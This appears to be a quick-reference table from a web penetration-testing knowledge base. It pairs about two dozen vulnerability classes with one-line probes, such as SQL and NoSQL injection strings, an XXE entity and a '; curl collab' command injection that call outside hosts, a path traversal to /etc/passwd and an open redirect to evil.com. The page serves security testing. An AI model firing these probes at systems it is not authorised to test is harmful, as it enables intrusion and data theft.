# Per-Vuln Quick Reference

One screen per class. Fastest confirmation, then the file.

| Class | Fastest confirm | File |
|---|---|---|
| IDOR | swap id to account B's | `02-web/access-control-idor.md` |
| Auth bypass | replay as anon / client-side check | `02-web/auth-and-session.md` |
| SQLi | `'` then `' AND '1'='1` vs `'2'` | `02-web/sql-injection.md` |
| NoSQL | `pass[$ne]=1` | `02-web/nosql-injection.md` |
| XSS | marker, view source, context escape | `02-web/xss.md` |
| SSRF | `http://<tok>.collab/` | `02-web/ssrf.md` |
| XXE | `<!ENTITY x SYSTEM "http://collab/">` | `02-web/xxe.md` |
| SSTI | `{{7*7}}` → 49 | `02-web/ssti.md` |
| Cmd inj | `; sleep 5` / `; curl collab` | `02-web/command-injection.md` |
| LFI | `?file=../../../../etc/passwd` | `02-web/file-inclusion-and-upload.md` |
| Upload | `.php`, `image/jpeg`, `GIF89a;` | same |
| Deser | decode the cookie, look for `O:` / `rO0` | `02-web/deserialization.md` |
| Smuggling | CL.TE timing probe | `02-web/request-smuggling.md` |
| Cache poison | `X-Forwarded-Host: evil` + `Age` | `02-web/cache-poisoning.md` |
| Host header | `Host: localhost` on reset | `02-web/host-header.md` |
| CORS | `Origin: evil` + `ACAC: true` | `02-web/cors.md` |
| CSRF | remove token, `text/plain` | `02-web/csrf.md` |
| Open redirect | `?next=//evil.com` | `02-web/open-redirect.md` |
| GraphQL | `{__typename}` | `02-web/graphql.md` |
| JWT | decode, `alg:none` | `02-web/jwt-and-oauth.md` |
| Race | 30 concurrent redeems | `02-web/race-conditions.md` |
| Logic | `quantity=-1` | `02-web/business-logic.md` |
| WS | `Origin: evil` on handshake | `02-web/websockets.md` |
| Info leak | `/.git/config`, `/actuator/env` | `02-web/info-disclosure.md` |
| Takeover | dangling CNAME + fingerprint | `02-web/subdomain-takeover.md` |
| LDAP | `user=*)(uid=*` | `02-web/ldap-and-xpath.md` |

---

## Related

- `00-core/connection-map.md`
- `00-core/never-stop.md`
- `11-regex/README.md`
